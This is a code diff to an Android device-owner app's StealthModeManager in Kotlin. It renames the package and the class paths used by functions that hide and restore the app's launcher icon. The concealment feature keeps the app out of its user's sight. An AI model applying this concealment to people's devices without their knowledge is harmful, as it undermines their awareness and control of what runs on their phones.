@@ -1,4 +1,4 @@
-package com.example.deviceowner.security.mode
+package com.microspace.payo.security.mode
 
 import android.app.admin.DevicePolicyManager
 import android.content.ComponentName
@@ -6,7 +6,7 @@ import android.content.Context
 import android.content.pm.PackageManager
 import android.os.Build
 import android.util.Log
-import com.example.deviceowner.receivers.AdminReceiver
+import com.microspace.payo.receivers.AdminReceiver
 
 /**
  * STEALTH MODE MANAGER
@@ -166,7 +166,7 @@ class StealthModeManager(private val context: Context) {
  */
 fun hideAppIconFromLauncher(context: Context, launcherActivityClass: Class<*>? = null) {
     val activityClass = launcherActivityClass ?: try {
-        Class.forName("com.example.deviceowner.ui.activities.main.MainActivity")
+        Class.forName("com.microspace.payo.ui.activities.main.MainActivity")
     } catch (e: Exception) {
         Log.e("StealthMode", "Could not find MainActivity: ${e.message}")
         return
@@ -190,7 +190,7 @@ fun hideAppIconFromLauncher(context: Context, launcherActivityClass: Class<*>? =
  */
 fun showAppIconInLauncher(context: Context, launcherActivityClass: Class<*>? = null) {
     val activityClass = launcherActivityClass ?: try {
-        Class.forName("com.example.deviceowner.ui.activities.main.MainActivity")
+        Class.forName("com.microspace.payo.ui.activities.main.MainActivity")
     } catch (e: Exception) {
         Log.e("StealthMode", "Could not find MainActivity: ${e.message}")
         return
